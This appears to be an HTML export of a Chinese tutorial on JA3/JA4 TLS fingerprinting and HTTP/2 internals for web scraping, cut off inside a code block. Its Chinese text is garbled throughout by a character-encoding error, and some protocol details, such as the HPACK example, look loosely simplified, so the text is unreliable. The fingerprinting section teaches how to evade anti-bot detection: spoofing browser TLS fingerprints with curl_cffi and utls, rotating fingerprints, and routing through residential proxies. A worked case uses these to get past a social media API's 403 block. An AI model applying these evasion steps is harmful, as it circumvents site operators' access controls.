      <hr />

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>TLS æ¡æ‰‹è¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯ä¼šå‘é€ä¸€ç³»åˆ—å‚æ•°ï¼ˆå¦‚æ”¯æŒçš„åŠ å¯†å¥—ä»¶ã€æ‰©å±•ç­‰ï¼‰ï¼Œè¿™äº›å‚æ•°çš„ç»„åˆå¯ä»¥ä½œä¸ºæŒ‡çº¹è¯†åˆ«å®¢æˆ·ç«¯ç±»å‹ã€‚JA3/JA4 æ˜¯ç›®å‰æœ€æµè¡Œçš„ TLS æŒ‡çº¹æŠ€æœ¯ã€‚</p>

      <hr />

      <h2 id="tls-æ¡æ‰‹å›é¡¾">TLS æ¡æ‰‹å›é¡¾</h2>

      <pre><code>Client -----&gt; ClientHello (åŒ…å«åŠ å¯†å¥—ä»¶ã€æ‰©å±•ç­‰) -----&gt; Server
Client &lt;----- ServerHello (é€‰æ‹©åŠ å¯†å¥—ä»¶)        &lt;----- Server
...
</code></pre>

      <p><strong>ClientHello åŒ…å«çš„ä¿¡æ¯</strong>:</p>

      <ul>
        <li>TLS ç‰ˆæœ¬</li>
        <li>æ”¯æŒçš„åŠ å¯†å¥—ä»¶åˆ—è¡¨</li>
        <li>æ”¯æŒçš„å‹ç¼©æ–¹æ³•</li>
        <li>æ‰©å±•ï¼ˆExtensionï¼‰åˆ—è¡¨</li>
      </ul>

      <hr />

      <h2 id="ja3-æŒ‡çº¹">JA3 æŒ‡çº¹</h2>

      <h3 id="1-åŸç†">1. åŸç†</h3>

      <p>JA3 å°† ClientHello ä¸­çš„å…³é”®å­—æ®µæ‹¼æ¥æˆå­—ç¬¦ä¸²ï¼Œç„¶åè®¡ç®— MD5ã€‚</p>

      <p><strong>å­—æ®µ</strong>:</p>

      <pre><code>TLSç‰ˆæœ¬, åŠ å¯†å¥—ä»¶åˆ—è¡¨, æ‰©å±•åˆ—è¡¨, æ¤­åœ†æ›²çº¿åˆ—è¡¨, æ¤­åœ†æ›²çº¿ç‚¹æ ¼å¼
</code></pre>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <pre><code>771,49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-5-10-11-13-65281,23-24-25,0
</code></pre>

      <p>è®¡ç®— MD5:</p>

      <pre><code>JA3 = md5("771,49195-49199-...")
    = "3b5074b1b5d032e5620f69f9f700ff0e"
</code></pre>

      <h3 id="2-ç”¨é€”">2. ç”¨é€”</h3>

      <p><strong>æœåŠ¡å™¨ç«¯</strong>:</p>

      <ul>
        <li>è¯†åˆ«å®¢æˆ·ç«¯ç±»å‹ï¼ˆæµè§ˆå™¨ vs è„šæœ¬ï¼‰</li>
        <li>å°ç¦ç‰¹å®šå®¢æˆ·ç«¯ï¼ˆå¦‚ Python requests çš„ JA3ï¼‰</li>
      </ul>

      <p><strong>æ”»å‡»è€…</strong>:</p>

      <ul>
        <li>ä¼ªé€ æµè§ˆå™¨çš„ TLS æŒ‡çº¹</li>
      </ul>

      <hr />

      <h2 id="ja3-æ£€æµ‹">JA3 æ£€æµ‹</h2>

      <h3 id="åœ¨çº¿å·¥å…·">åœ¨çº¿å·¥å…·</h3>

      <ul>
        <li><a href="https://tls.peet.ws/api/clean">tls.peet.ws</a> - æŸ¥çœ‹è‡ªå·±çš„ JA3</li>
        <li><a href="https://ja3er.com/">JA3er</a> - JA3 æ•°æ®åº“</li>
      </ul>

      <h3 id="wireshark-æŠ“åŒ…">Wireshark æŠ“åŒ…</h3>

      <ol>
        <li>æ•è· HTTPS æµé‡</li>
        <li>è¿‡æ»¤ <code>ssl.handshake.type == 1</code> (ClientHello)</li>
        <li>æŸ¥çœ‹ <code>Cipher Suites</code> å’Œ <code>Extensions</code></li>
      </ol>

      <hr />

      <h2 id="ja3-ä¼ªé€ ">JA3 ä¼ªé€ </h2>

      <h3 id="æ–¹æ³•ä¸€ä½¿ç”¨æ”¯æŒ-tls-æŒ‡çº¹çš„åº“">æ–¹æ³•ä¸€ï¼šä½¿ç”¨æ”¯æŒ TLS æŒ‡çº¹çš„åº“</h3>

      <p><strong>Python - curl_cffi</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">curl_cffi</span><span class="w"> </span><span class="kn">import</span> <span class="n">requests</span>

<span class="c1"># æ¨¡æ‹Ÿ Chrome</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://tls.peet.ws/api/clean&#39;</span><span class="p">,</span> <span class="n">impersonate</span><span class="o">=</span><span class="s1">&#39;chrome110&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>Go - utls</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="s">&quot;github.com/refraction-networking/utls&quot;</span>

<span class="nx">config</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">utls</span><span class="p">.</span><span class="nx">Config</span><span class="p">{</span>
<span class="w">    </span><span class="nx">ServerName</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;example.com&quot;</span><span class="p">,</span>
<span class="p">}</span>
<span class="nx">conn</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">utls</span><span class="p">.</span><span class="nx">UClient</span><span class="p">(</span><span class="nx">tcpConn</span><span class="p">,</span><span class="w"> </span><span class="nx">config</span><span class="p">,</span><span class="w"> </span><span class="nx">utls</span><span class="p">.</span><span class="nx">HelloChrome_Auto</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="æ–¹æ³•äºŒä½¿ç”¨çœŸå®æµè§ˆå™¨rpc">æ–¹æ³•äºŒï¼šä½¿ç”¨çœŸå®æµè§ˆå™¨ï¼ˆRPCï¼‰</h3>

      <p>é€šè¿‡ Puppeteer/Playwright æ§åˆ¶çœŸå®æµè§ˆå™¨ï¼Œå¤©ç„¶å…·æœ‰æ­£ç¡®çš„ TLS æŒ‡çº¹ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">puppeteer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer&#39;</span><span class="p">);</span>

<span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">content</span><span class="p">();</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ja4-ä¸‹ä¸€ä»£æŒ‡çº¹">JA4 - ä¸‹ä¸€ä»£æŒ‡çº¹</h2>

      <h3 id="ä¸-ja3-çš„åŒºåˆ«">ä¸ JA3 çš„åŒºåˆ«</h3>

      <table>
        <thead>
          <tr>
            <th>ç‰¹æ€§</th>
            <th>JA3</th>
            <th>JA4</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>æ ¼å¼</strong></td>
            <td>MD5 å“ˆå¸Œ</td>
            <td>äººç±»å¯è¯»å­—ç¬¦ä¸²</td>
          </tr>
          <tr>
            <td><strong>åè®®æ”¯æŒ</strong></td>
            <td>TLS 1.0-1.3</td>
            <td>TLS 1.0-1.3, QUIC</td>
          </tr>
          <tr>
            <td><strong>ç»†ç²’åº¦</strong></td>
            <td>ä¸­</td>
            <td>é«˜</td>
          </tr>
          <tr>
            <td><strong>å¯è¯»æ€§</strong></td>
            <td>ä½ï¼ˆå“ˆå¸Œï¼‰</td>
            <td>é«˜ï¼ˆåˆ†æ®µå­—ç¬¦ä¸²ï¼‰</td>
          </tr>
        </tbody>
      </table>

      <p><strong>JA4 ç¤ºä¾‹</strong>:</p>

      <pre><code>t13d1516h2_8daaf6152771_e5627efa2ab1
</code></pre>

      <ul>
        <li><code>t13</code>: TLS 1.3</li>
        <li><code>d15</code>: åŠ å¯†å¥—ä»¶æ•°é‡</li>
        <li><code>16</code>: æ‰©å±•æ•°é‡</li>
        <li><code>h2</code>: ALPN (HTTP/2)</li>
      </ul>

      <hr />

      <h2 id="ç»•è¿‡-tls-æŒ‡çº¹æ£€æµ‹">ç»•è¿‡ TLS æŒ‡çº¹æ£€æµ‹</h2>

      <h3 id="1-ä½¿ç”¨æ¨¡æ‹Ÿåº“">1. ä½¿ç”¨æ¨¡æ‹Ÿåº“</h3>

      <p>é€‰æ‹©æ”¯æŒè‡ªå®šä¹‰ TLS æŒ‡çº¹çš„ HTTP åº“ï¼š</p>

      <ul>
        <li><code>curl_cffi</code> (Python)</li>
        <li><code>utls</code> (Go)</li>
        <li><code>tls-client</code> (Python wrapper for Go utls)</li>
      </ul>

      <h3 id="2-é¢‘ç¹æ›´æ¢æŒ‡çº¹">2. é¢‘ç¹æ›´æ¢æŒ‡çº¹</h3>

      <p>å³ä½¿è¢«è¯†åˆ«ï¼Œä¹Ÿå¯ä»¥è½®æ¢ä¸åŒçš„æµè§ˆå™¨æŒ‡çº¹ï¼ˆChrome/Firefox/Safariï¼‰ã€‚</p>

      <h3 id="3-ä½¿ç”¨ä½å®…ä»£ç†">3. ä½¿ç”¨ä½å®…ä»£ç†</h3>

      <p>é«˜è´¨é‡ä½å®…ä»£ç†é€šå¸¸ä¼šä¿ç•™çœŸå®ç”¨æˆ·çš„ TLS ç‰¹å¾ã€‚</p>

      <hr />

      <h2 id="æ£€æµ‹ç½‘ç«™æ˜¯å¦ä½¿ç”¨-tls-æŒ‡çº¹">æ£€æµ‹ç½‘ç«™æ˜¯å¦ä½¿ç”¨ TLS æŒ‡çº¹</h2>

      <p><strong>æ–¹æ³•</strong>:</p>

      <ol>
        <li>ç”¨ <code>requests</code> åº“å’ŒçœŸå®æµè§ˆå™¨åˆ†åˆ«è®¿é—®åŒä¸€æ¥å£</li>
        <li>å¦‚æœ <code>requests</code> è¿”å› 403/401ï¼Œæµè§ˆå™¨æ­£å¸¸ï¼Œå¯èƒ½æ˜¯ TLS æŒ‡çº¹æ£€æµ‹</li>
      </ol>

      <p><strong>éªŒè¯</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="c1"># Python requests çš„ TLS æŒ‡çº¹</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://tls.peet.ws/api/clean&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>  <span class="c1"># æŸ¥çœ‹ JA3</span>
</code></pre>
      </div>

      <p>å¯¹æ¯”æµè§ˆå™¨è®¿é—® <code>https://tls.peet.ws/api/clean</code> çš„ç»“æœã€‚</p>

      <hr />

      <h2 id="å®æˆ˜æ¡ˆä¾‹">å®æˆ˜æ¡ˆä¾‹</h2>

      <h3 id="æ¡ˆä¾‹æŸç¤¾äº¤åª’ä½“-api">æ¡ˆä¾‹ï¼šæŸç¤¾äº¤åª’ä½“ API</h3>

      <p><strong>ç°è±¡</strong>: Python requests è¯·æ±‚è¿”å› 403ï¼Œæµè§ˆå™¨æ­£å¸¸ã€‚</p>

      <p><strong>åˆ†æ</strong>:</p>

      <ol>
        <li>æ£€æŸ¥ User-Agent - å·²ä¼ªé€ ï¼Œä»ç„¶å¤±è´¥</li>
        <li>æ£€æŸ¥ Cookie - å·²æºå¸¦ï¼Œä»ç„¶å¤±è´¥</li>
        <li>æ€€ç–‘ TLS æŒ‡çº¹</li>
      </ol>

      <p><strong>è§£å†³</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">curl_cffi</span><span class="w"> </span><span class="kn">import</span> <span class="n">requests</span>

<span class="c1"># ä½¿ç”¨ curl_cffi æ¨¡æ‹Ÿ Chrome çš„ TLS æŒ‡çº¹</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
    <span class="s1">&#39;https://api.socialmedia.com/user/info&#39;</span><span class="p">,</span>
    <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 ...&#39;</span><span class="p">},</span>
    <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;session&#39;</span><span class="p">:</span> <span class="s1">&#39;xxx&#39;</span><span class="p">},</span>
    <span class="n">impersonate</span><span class="o">=</span><span class="s1">&#39;chrome110&#39;</span>
<span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>  <span class="c1"># æˆåŠŸï¼</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³èµ„æº">ç›¸å…³èµ„æº</h2>

      <ul>
        <li><a href="https://github.com/salesforce/ja3">JA3 - Salesforce</a></li>
        <li><a href="https://github.com/FoxIO-LLC/ja4">JA4+ Network Fingerprinting</a></li>
        <li><a href="https://github.com/lwthiker/curl-impersonate">curl-impersonate</a></li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-browser-fingerprinting">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</a></li>
        <li><a href="#04-Advanced-Recipes-http2-http3">HTTP/2 ä¸ HTTP/3</a></li>
        <li><a href="#04-Advanced-Recipes-anti-scraping-deep-dive">åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</a></li>
      </ul>

    </div>

    <div class="section" id="04-Advanced-Recipes-http2-http3">
      <h2>43. HTTP/2 & HTTP/3</h2>
      <h1 id="http2-ä¸-http3">HTTP/2 ä¸ HTTP/3</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>HTTP/2 å’Œ HTTP/3 æ˜¯ HTTP åè®®çš„æœ€æ–°ç‰ˆæœ¬ï¼Œå¸¦æ¥äº†æ€§èƒ½æå‡å’Œæ–°çš„ç‰¹æ€§ã€‚åœ¨é€†å‘å·¥ç¨‹ä¸­ï¼Œç†è§£è¿™äº›åè®®çš„å·¥ä½œåŸç†å¯¹äºåˆ†æç°ä»£ Web åº”ç”¨è‡³å…³é‡è¦ã€‚</p>

      <p><strong>ä¸ºä»€ä¹ˆè¦å­¦ä¹  HTTP/2 å’Œ HTTP/3ï¼Ÿ</strong></p>

      <ol>
        <li><strong>ç°ä»£ç½‘ç«™çš„æ ‡å‡†</strong>: å¤§éƒ¨åˆ†ä¸»æµç½‘ç«™å·²è¿ç§»åˆ° HTTP/2ï¼ŒHTTP/3 ä¹Ÿåœ¨å¿«é€Ÿæ™®åŠ</li>
        <li><strong>æ€§èƒ½ä¼˜åŒ–</strong>: å¤šè·¯å¤ç”¨ã€å¤´éƒ¨å‹ç¼©ç­‰ç‰¹æ€§æ”¹å˜äº†è¯·æ±‚æ¨¡å¼</li>
        <li><strong>é€†å‘éš¾åº¦å¢åŠ </strong>: äºŒè¿›åˆ¶åè®®ã€åŠ å¯†ä¼ è¾“å¢åŠ äº†åˆ†æéš¾åº¦</li>
        <li><strong>æŒ‡çº¹è¯†åˆ«</strong>: TLS æŒ‡çº¹å’Œåè®®ç‰¹å¾å¯ç”¨äºæ£€æµ‹è‡ªåŠ¨åŒ–å·¥å…·</li>
      </ol>

      <hr />

      <h2 id="1-http1x-çš„å±€é™æ€§">1. HTTP/1.x çš„å±€é™æ€§</h2>

      <h3 id="11-é˜Ÿå¤´é˜»å¡-head-of-line-blocking">1.1 é˜Ÿå¤´é˜»å¡ (Head-of-Line Blocking)</h3>

      <p><strong>é—®é¢˜</strong>: HTTP/1.1 åœ¨å•ä¸ª TCP è¿æ¥ä¸Šä¸€æ¬¡åªèƒ½å¤„ç†ä¸€ä¸ªè¯·æ±‚</p>

      <pre><code>è¯·æ±‚1: |========== å“åº” ==========|
è¯·æ±‚2:                              |===== å“åº” =====|
è¯·æ±‚3:                                                |== å“åº” ==|
</code></pre>

      <p><strong>å½±å“</strong>: å‰é¢çš„æ…¢è¯·æ±‚ä¼šé˜»å¡åé¢çš„æ‰€æœ‰è¯·æ±‚</p>

      <p><strong>å˜é€šæ–¹æ¡ˆ</strong> (HTTP/1.1):</p>

      <ul>
        <li><strong>Pipeline</strong>: å‘é€å¤šä¸ªè¯·æ±‚ä½†ä»æŒ‰é¡ºåºå“åº”ï¼ˆæµè§ˆå™¨é»˜è®¤ç¦ç”¨ï¼‰</li>
        <li><strong>Domain Sharding</strong>: ä½¿ç”¨å¤šä¸ªåŸŸåå¢åŠ å¹¶å‘è¿æ¥æ•°</li>
        <li><strong>è¿æ¥å¤ç”¨</strong>: ä¿æŒè¿æ¥ (Keep-Alive)</li>
      </ul>

      <p><strong>é™åˆ¶</strong>: æµè§ˆå™¨é€šå¸¸é™åˆ¶æ¯ä¸ªåŸŸåæœ€å¤š 6 ä¸ªå¹¶å‘è¿æ¥</p>

      <hr />

      <h3 id="12-å¤´éƒ¨å†—ä½™">1.2 å¤´éƒ¨å†—ä½™</h3>

      <p><strong>é—®é¢˜</strong>: æ¯ä¸ªè¯·æ±‚éƒ½é‡å¤å‘é€ç›¸åŒçš„ HTTP å¤´éƒ¨</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nf">GET</span> <span class="nn">/api/data?id=1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">example.com</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0...</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">session=abc123...</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="nf">GET</span> <span class="nn">/api/data?id=2</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">example.com</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0...        &lt;-- é‡å¤</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">application/json          &lt;-- é‡å¤</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">session=abc123...         &lt;-- é‡å¤</span>
</code></pre>
      </div>

      <p><strong>å½±å“</strong>: å¸¦å®½æµªè´¹ï¼Œå°¤å…¶æ˜¯ç§»åŠ¨ç½‘ç»œ</p>

      <hr />

      <h3 id="13-æ˜æ–‡åè®®">1.3 æ˜æ–‡åè®®</h3>

      <p><strong>é—®é¢˜</strong>: HTTP/1.x æœ¬èº«ä¸å¼ºåˆ¶åŠ å¯†</p>

      <p><strong>å®‰å…¨é£é™©</strong>:</p>

      <ul>
        <li>ä¸­é—´äººæ”»å‡»</li>
        <li>æµé‡å—…æ¢</li>
        <li>å†…å®¹ç¯¡æ”¹</li>
      </ul>

      <hr />

      <h2 id="2-http2-è¯¦è§£">2. HTTP/2 è¯¦è§£</h2>

      <h3 id="21-æ ¸å¿ƒç‰¹æ€§">2.1 æ ¸å¿ƒç‰¹æ€§</h3>

      <h4 id="211-äºŒè¿›åˆ¶åˆ†å¸§-binary-framing">2.1.1 äºŒè¿›åˆ¶åˆ†å¸§ (Binary Framing)</h4>

      <p><strong>HTTP/1.x</strong>: åŸºäºæ–‡æœ¬ï¼Œä½¿ç”¨æ¢è¡Œç¬¦åˆ†éš”</p>

      <pre><code>GET /index.html HTTP/1.1\r\n
Host: example.com\r\n
\r\n
</code></pre>

      <p><strong>HTTP/2</strong>: åŸºäºäºŒè¿›åˆ¶å¸§</p>

      <pre><code>+-----------------------------------------------+
|                 Frame Header                   |
+-----------------------------------------------+
| Length (24) | Type (8) | Flags (8) | R |Stream|
+-----------------------------------------------+
|                 Frame Payload                  |
+-----------------------------------------------+
</code></pre>

      <p><strong>å¸§ç±»å‹</strong>:</p>

      <ul>
        <li><code>HEADERS</code>: HTTP å¤´éƒ¨</li>
        <li><code>DATA</code>: æ¶ˆæ¯ä½“</li>
        <li><code>PRIORITY</code>: ä¼˜å…ˆçº§</li>
        <li><code>RST_STREAM</code>: é‡ç½®æµ</li>
        <li><code>SETTINGS</code>: è¿æ¥è®¾ç½®</li>
        <li><code>PUSH_PROMISE</code>: æœåŠ¡å™¨æ¨é€</li>
        <li><code>PING</code>: å¿ƒè·³æ£€æµ‹</li>
        <li><code>GOAWAY</code>: è¿æ¥å…³é—­</li>
        <li><code>WINDOW_UPDATE</code>: æµé‡æ§åˆ¶</li>
        <li><code>CONTINUATION</code>: å¤´éƒ¨å»¶ç»­</li>
      </ul>

      <p><strong>é€†å‘å½±å“</strong>:</p>

      <ul>
        <li>âœ… <strong>æ›´é«˜æ•ˆ</strong>: è§£æé€Ÿåº¦å¿«</li>
        <li>âŒ <strong>ä¸å¯è¯»</strong>: æ— æ³•ç›´æ¥ç”¨ <code>cat</code> æŸ¥çœ‹</li>
        <li>ğŸ› ï¸ <strong>éœ€è¦å·¥å…·</strong>: Wiresharkã€Chrome DevTools</li>
      </ul>

      <hr />

      <h4 id="212-å¤šè·¯å¤ç”¨-multiplexing">2.1.2 å¤šè·¯å¤ç”¨ (Multiplexing)</h4>

      <p><strong>åŸç†</strong>: åœ¨å•ä¸ª TCP è¿æ¥ä¸Šå¹¶å‘å¤šä¸ª HTTP æµ (Streams)</p>

      <pre><code>TCP è¿æ¥
|
â”œâ”€â”€ Stream 1: GET /css/style.css
â”œâ”€â”€ Stream 3: GET /js/app.js
â”œâ”€â”€ Stream 5: GET /img/logo.png
â””â”€â”€ Stream 7: POST /api/submit
</code></pre>

      <p><strong>ä¼˜åŠ¿</strong>:</p>

      <ul>
        <li><strong>æ¶ˆé™¤é˜Ÿå¤´é˜»å¡</strong>: è¯·æ±‚å’Œå“åº”ä¸å†ç›¸äº’é˜»å¡</li>
        <li><strong>å‡å°‘è¿æ¥æ•°</strong>: ä¸€ä¸ªåŸŸååªéœ€ä¸€ä¸ªè¿æ¥</li>
        <li><strong>é™ä½å»¶è¿Ÿ</strong>: åŒæ—¶å‘é€å¤šä¸ªè¯·æ±‚</li>
      </ul>

      <p><strong>é€†å‘å½±å“</strong>:</p>

      <ul>
        <li>Network é¢æ¿ä¸­è¯·æ±‚é¡ºåºä¸å®é™…å‘é€é¡ºåºå¯èƒ½ä¸åŒ</li>
        <li>æ— æ³•é€šè¿‡è¯·æ±‚é¡ºåºåˆ¤æ–­é€»è¾‘æµç¨‹</li>
        <li>éœ€è¦å…³æ³¨ Stream ID è€Œéæ—¶é—´æˆ³</li>
      </ul>

      <p><strong>Chrome DevTools ä¸­æŸ¥çœ‹</strong>:</p>

      <ol>
        <li>æ‰“å¼€ Network é¢æ¿</li>
        <li>å³é”®è¡¨å¤´ â†’ å‹¾é€‰ &#8220;Protocol&#8221;</li>
        <li>æŸ¥çœ‹åè®®åˆ—æ˜¾ç¤º <code>h2</code>ï¼ˆHTTP/2ï¼‰</li>
      </ol>

      <hr />

      <h4 id="213-å¤´éƒ¨å‹ç¼©-hpack">2.1.3 å¤´éƒ¨å‹ç¼© (HPACK)</h4>

      <p><strong>åŸç†</strong>: ä½¿ç”¨ä¸“ç”¨å‹ç¼©ç®—æ³•ï¼ˆHPACKï¼‰å’Œé™æ€/åŠ¨æ€è¡¨</p>

      <p><strong>é™æ€è¡¨</strong> (å¸¸è§å¤´éƒ¨é¢„å®šä¹‰):</p>

      <pre><code>Index | Header Name     | Header Value
------+-----------------+-------------
1     | :authority      |
2     | :method         | GET
3     | :method         | POST
4     | :path           | /
5     | :path           | /index.html
...
</code></pre>

      <p><strong>åŠ¨æ€è¡¨</strong> (ä¼šè¯ä¸­å‡ºç°çš„å¤´éƒ¨):</p>

      <pre><code>62 | cookie: session=abc123
63 | user-agent: Mozilla/5.0...
</code></pre>

      <p><strong>ç¼–ç ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="err"># åŸå§‹å¤´éƒ¨</span>
<span class="err">:method: GET</span>
<span class="err">:path: /api/user</span>
<span class="err">cookie: session=abc123</span>

<span class="err"># HPACK ç¼–ç  (ç®€åŒ–è¡¨ç¤º)</span>
<span class="err">82          # :method GET (é™æ€è¡¨ç´¢å¼• 2)</span>
<span class="err">84          # :path /api/user (å­—é¢é‡)</span>
<span class="err">BE          # cookie: session=abc123 (åŠ¨æ€è¡¨ç´¢å¼• 62)</span>
</code></pre>
      </div>

      <p><strong>å‹ç¼©ç‡</strong>: é€šå¸¸å¯è¾¾ 70-90%</p>

      <p><strong>é€†å‘éš¾ç‚¹</strong>:</p>

      <ul>
        <li>å¤´éƒ¨æ˜¯åŠ¨æ€å‹ç¼©çš„ï¼Œæ— æ³•ç›´æ¥è§£æ</li>
        <li>éœ€è¦ç»´æŠ¤ä¼šè¯çŠ¶æ€æ‰èƒ½æ­£ç¡®è§£ç </li>
        <li>å·¥å…·æ”¯æŒ: Wireshark è‡ªåŠ¨è§£å‹</li>
      </ul>

      <hr />

      <h4 id="214-æœåŠ¡å™¨æ¨é€-server-push">2.1.4 æœåŠ¡å™¨æ¨é€ (Server Push)</h4>

      <p><strong>åŸç†</strong>: æœåŠ¡å™¨ä¸»åŠ¨æ¨é€å®¢æˆ·ç«¯æœªè¯·æ±‚çš„èµ„æº</p>

      <p><strong>æµç¨‹</strong>:</p>

      <pre><code>å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: GET /index.html

æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: PUSH_PROMISE stream=2 (æ¨é€ /style.css)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: HEADERS stream=1 (å“åº” index.html)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: DATA stream=1 (&lt;html&gt;...)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: HEADERS stream=2 (å“åº” style.css)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: DATA stream=2 (body { ... })
</code></pre>

      <p><strong>å¥½å¤„</strong>:</p>

      <ul>
        <li>å‡å°‘å¾€è¿”å»¶è¿Ÿ (RTT)</li>
        <li>æå‰åŠ è½½å…³é”®èµ„æº</li>
      </ul>

      <p><strong>é€†å‘æ³¨æ„</strong>:</p>

      <ul>
        <li>Network é¢æ¿ä¸­çœ‹åˆ° <code>Push</code> æ ‡è®°</li>
        <li>å¯èƒ½çœ‹åˆ°æœªå‘èµ·è¯·æ±‚çš„èµ„æºåŠ è½½</li>
      </ul>

      <hr />

      <h4 id="215-æµé‡æ§åˆ¶-flow-control">2.1.5 æµé‡æ§åˆ¶ (Flow Control)</h4>

      <p><strong>åŸç†</strong>: ä½¿ç”¨ <code>WINDOW_UPDATE</code> å¸§æ§åˆ¶å‘é€é€Ÿç‡</p>

      <p><strong>åœºæ™¯</strong>: é˜²æ­¢å¿«é€Ÿå‘é€æ–¹å‹å®æ…¢é€Ÿæ¥æ”¶æ–¹</p>

      <pre><code>å‘é€æ–¹                æ¥æ”¶æ–¹
  |                      |
  |---- DATA (16KB) ----&gt;|
  |                      | (ç¼“å†²åŒºæ»¡)
  |&lt;-- WINDOW_UPDATE ---|  (é€šçŸ¥å¯æ¥æ”¶)
  |---- DATA (16KB) ----&gt;|
</code></pre>

      <hr />

      <h3 id="22-http2-æŠ“åŒ…ä¸åˆ†æ">2.2 HTTP/2 æŠ“åŒ…ä¸åˆ†æ</h3>

      <h4 id="ä½¿ç”¨-wireshark-åˆ†æ-http2">ä½¿ç”¨ Wireshark åˆ†æ HTTP/2</h4>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li><strong>å¯åŠ¨æŠ“åŒ…</strong>: æ•è· HTTPS æµé‡</li>
        <li><strong>è§£å¯† TLS</strong>: è®¾ç½® SSL/TLS è§£å¯†ï¼ˆéœ€è¦ç§é’¥æˆ–æµè§ˆå™¨å¯†é’¥æ—¥å¿—ï¼‰</li>
        <li><strong>è¿‡æ»¤ HTTP/2</strong>: ä½¿ç”¨è¿‡æ»¤å™¨ <code>http2</code></li>
      </ol>

      <p><strong>Chrome å¯¼å‡ºå¯†é’¥æ—¥å¿—</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># macOS/Linux</span>
